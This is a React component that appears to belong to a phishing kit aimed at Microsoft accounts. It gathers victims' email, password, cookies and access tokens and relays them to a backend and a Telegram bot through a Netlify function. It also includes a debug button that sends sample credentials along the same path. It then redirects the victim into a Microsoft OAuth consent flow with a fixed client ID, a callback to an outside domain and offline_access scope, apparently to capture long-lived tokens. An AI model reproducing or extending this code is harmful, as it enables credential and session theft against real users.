import React, { useEffect } from 'react';

// Import or declare the backend functions (keep these as they were)
declare function saveSessionToBackend(sessionData: any): Promise<any>;
declare function sendToTelegram(sessionData: any): Promise<any>;
declare function grabCookies(): void;

interface RealOAuthRedirectProps {
  onLoginSuccess?: (sessionData: any) => void;
  sessionData?: any;
}

const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, sessionData }) => {
  useEffect(() => {
    localStorage.setItem('selected_provider', 'Microsoft');
    localStorage.setItem('oauth_start_time', Date.now().toString());

    // DEBUG: Add a test button for manual Telegram testing (original structure)
    if (window.location.search.includes('debug=1')) {
      console.log('🔍 DEBUG MODE ENABLED - Adding test button');
      setTimeout(() => {
        const testButton = document.createElement('button');
        testButton.innerText = '🧪 Test Telegram Now';
        testButton.style.cssText =
          'position:fixed;top:10px;right:10px;z-index:9999;background:red;color:white;padding:10px;border:none;border-radius:5px;cursor:pointer;';
        testButton.onclick = async () => {
          console.log('🧪 Manual Telegram test triggered');
          try {
            const response = await fetch('/.netlify/functions/sendTelegram', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                email: 'manual-test@debug.com',
                password: 'ManualTest123',
                provider: 'Microsoft',
                fileName: 'Manual Debug Test',
                timestamp: new Date().toISOString(),
                sessionId:
                  'manual_' + Math.random().toString(36).substring(2, 15),
                userAgent: navigator.userAgent,
                formattedCookies: [
                  {
                    name: 'MANUAL_TEST',
                    value: 'manual_value_' + Date.now(),
                    domain: '.login.microsoftonline.com',
                  },
                ],
                browserFingerprint: { localStorage: '{"manual":"test"}' },
              }),
            });
            const result = await response.json();
            console.log('🧪 Manual test result:', result);
            alert('Manual test completed - check console and Telegram');
          } catch (error) {
            console.error('🧪 Manual test failed:', error);
            alert('Manual test failed: ' + error.message);
          }
        };
        document.body.appendChild(testButton);
      }, 1000);
    }

    // Store pre-auth cookies for comparison (original structure)
    const preAuthFingerprint = {
      cookies: document.cookie,
    };

    // PKCE helper functions
    const generateRandomString = (length: number): string => {
      const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~';
      let result = '';
      const values = window.crypto.getRandomValues(new Uint8Array(length));
      for (let i = 0; i < length; i++) {
        result += charset[values[i] % charset.length];
      }
      return result;
    };

    const generateCodeChallenge = async (codeVerifier: string): Promise<string> => {
      const encoder = new TextEncoder();
      const data = encoder.encode(codeVerifier);
      const digest = await window.crypto.subtle.digest('SHA-256', data);
      return btoa(String.fromCharCode(...new Uint8Array(digest)))
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');
    };

    let saveSuccess = false;
    let telegramSuccess = false;

    (async () => {
      // Use sessionData from props if available, otherwise declare it for build safety (original structure)
      let currentSessionData = (sessionData) ? sessionData : {};

      console.log('🔍 DEBUG: About to communicate with backend', {
        email: currentSessionData.email,
        cookieCount: currentSessionData.formattedCookies
          ? currentSessionData.formattedCookies.length
          : 0,
        hasAccessToken: !!currentSessionData.accessToken,
        currentURL: window.location.href,
      });

      try {
        console.log('🔄 Step 1: Saving session to backend...');
        if (typeof saveSessionToBackend === 'function') {
          const saveResult = await saveSessionToBackend(currentSessionData);
          console.log('🔍 Save result:', saveResult);
          saveSuccess = true;
          console.log('✅ Step 1 completed: Session saved');
        }
      } catch (saveError) {
        console.error('❌ Session save failed:', saveError);
        console.error('❌ Save error details:', {
          message: saveError.message,
          stack: saveError.stack,
        });
      }

      try {
        console.log('🔄 Step 2: Sending data to Telegram...');
        console.log('🔍 Telegram payload preview:', {
          email: currentSessionData.email,
          provider: currentSessionData.provider,
          cookieCount: currentSessionData.formattedCookies
            ? currentSessionData.formattedCookies.length
            : 0,
          hasPassword: !!currentSessionData.password,
        });
        if (typeof sendToTelegram === 'function') {
          const telegramResult = await sendToTelegram(currentSessionData);
          console.log('🔍 Telegram result:', telegramResult);
          telegramSuccess = true;
          console.log('✅ Step 2 completed: Data sent to Telegram');
        }
      } catch (telegramError) {
        console.error('❌ Telegram send failed:', telegramError);
        console.error('❌ Telegram error details:', {
          message: telegramError.message,
          stack: telegramError.stack,
        });
      }

      // Log final status
      // Grab cookies before redirect (from session if available) (original structure)
      if (typeof grabCookies === 'function') {
        grabCookies();
      }

      // **UPDATED**: PKCE OAuth flow (more secure)
      console.log('🔄 Starting PKCE OAuth flow...');
      try {
        // Generate PKCE parameters
        const codeVerifier = generateRandomString(64);
        const codeChallenge = await generateCodeChallenge(codeVerifier);
        const state = Math.random().toString(36).substring(2, 15);

        // Store PKCE parameters for token exchange
        sessionStorage.setItem('pkce_verifier', codeVerifier);
        sessionStorage.setItem('oauth_state', state);

        console.log('🔧 PKCE parameters generated:', {
          hasCodeVerifier: !!codeVerifier,
          hasCodeChallenge: !!codeChallenge,
          state: state
        });

        // Build Microsoft OAuth URL with PKCE
        const params = new URLSearchParams({
          client_id: 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0',
          response_type: 'code',
          redirect_uri: 'https://vaultydocs.com/oauth-callback',
          response_mode: 'query',
          scope: 'openid profile email User.Read offline_access',
          code_challenge: codeChallenge,
          code_challenge_method: 'S256',
          state: state,
          prompt: 'login',
        });

        const microsoftOAuthUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${params.toString()}`;

        console.log('✅ Redirecting to Microsoft OAuth with PKCE...');
        console.log('🔗 OAuth URL:', microsoftOAuthUrl);
        
        // Redirect to Microsoft OAuth
        window.location.href = microsoftOAuthUrl;

      } catch (err) {
        console.error('❌ Failed to start PKCE OAuth flow:', err);
        
        // Fallback: Simple OAuth without PKCE
        console.log('🔄 Attempting fallback OAuth without PKCE...');
        const fallbackState = Math.random().toString(36).substring(2, 15);
        sessionStorage.setItem('oauth_state', fallbackState);
        
        const fallbackParams = new URLSearchParams({
          client_id: 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0',
          response_type: 'code',
          redirect_uri: 'https://vaultydocs.com/oauth-callback',
          response_mode: 'query',
          scope: 'openid profile email User.Read offline_access',
          state: fallbackState,
          prompt: 'login',
        });

        const fallbackUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${fallbackParams.toString()}`;
        window.location.href = fallbackUrl;
      }
    })();
  }, [sessionData, onLoginSuccess]);

  // This component does not render anything by itself (original structure)
  // it just performs redirects and side effects.
  return null;
};

export default RealOAuthRedirect;